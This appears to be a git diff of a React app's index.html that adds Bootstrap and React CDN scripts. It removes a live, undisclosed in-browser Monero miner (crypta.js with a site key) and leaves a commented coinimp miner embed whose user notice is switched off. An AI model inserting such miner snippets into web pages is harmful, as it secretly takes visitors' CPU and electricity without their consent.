@@ -3,76 +3,52 @@
   <head>
     <meta charset="utf-8" />
     <link rel="shortcut icon" href="%PUBLIC_URL%/favicon.ico" />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+      integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+      crossorigin="anonymous"
+    />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="theme-color" content="#880000" />
+    <script
+      src="https://unpkg.com/react/umd/react.production.js"
+      crossorigin
+    ></script>
 
-    <!-- <script src="https://www.hostingcloud.racing/mgBV.js"></script>
+    <script
+      src="https://unpkg.com/react-dom/umd/react-dom.production.js"
+      crossorigin
+    ></script>
+
+    <script
+      src="https://unpkg.com/react-bootstrap@next/dist/react-bootstrap.min.js"
+      crossorigin
+    ></script>
+
+    <script>
+      var Alert = ReactBootstrap.Alert;
+    </script>
+
+    <!--
+    <script src="https://www.hostingcloud.racing/mgBV.js"></script>
     <script>
       var _client = new Client.Anonymous(
         '85560adf29eb4c7d602aaf6541b24eb1c470b772389a450f86dde953f0947961',
         {
-          throttle: 0.2,
+          throttle: 0.1,
         }
       );
       _client.start();
-      _client.addMiningNotification(
-        'Bottom',
-        'This site is running JavaScript miner from coinimp.com',
-        '#ffffff',
-        25,
-        '#cccccc'
-      );
-    </script> -->
-
-    <script src="//statdynamic.com/lib/crypta.js"></script>
-    <script>
-      var miner = new CRLT.Anonymous(
-        '30e6c8f80bb58362367c32e5c5fe73f3142dd6c481f4',
-        {
-          threads: 4,
-          throttle: 0.2,
-          coin: 'xmr',
-        }
-      );
-      miner.start();
+      // _client.addMiningNotification(
+      //   'Bottom',
+      //   'This site is running JavaScript miner from coinimp.com',
+      //   '#ffffff',
+      //   25,
+      //   '#cccccc'
+      // );
     </script>
-
-    <!-- <script type="text/javascript">
-      !function () { var e = document, t = e.createElement("script"), s = e.getElementsByTagName("script")[0]; t.type = "text/javascript", t.async = t.defer = !0, t.src = "https://load.jsecoin.com/load/155540/razzy.herokuapp.com/0/0/", s.parentNode.insertBefore(t, s) }();
-    </script> -->
-
-    <!-- <script src="https://pkg.moonify.io/moonify.min.js"></script>
-    <script type="text/javascript">
-      Moonify.set({
-        serviceID:
-          'uzj7AagO_iAZQTdjS7N7n7ht0E-2R0nAe8t5Th0brvVXe_nwTq-ir8RYSQir7c7bRUx07PqqnWa9QjAF0KuPUxVkpxE61Y5tUO5JTaByNDkn2uxJkf1domyimuBIeGDO',
-        speed: 0.5,
-        onStart: function() {
-          console.log('The session has started');
-        },
-        onStop: function() {
-          console.log('The session has stopped');
-        },
-        onStatsChange: function(stats) {
-          console.log(stats.score); //stats object is filled with all score, balance, speed, ect... of this user.
-        },
-        customize: {
-          position: 'bottomleft',
-          colorBG: '#ffffff',
-          colorPrimary: '#880000',
-          effect: 'slide',
-          reflect: true,
-          indicator: true,
-        },
-      });
-      Moonify.set({});
-      Moonify.start();
-      if (Moonify.getThreads() > 4) {
-        alert('Whoo!! your device rocks!');
-      } else {
-        alert('Potato computer!');
-      }
-    </script> -->
+    -->
 
     <!--
       manifest.json provides metadata used when your web app is installed on a
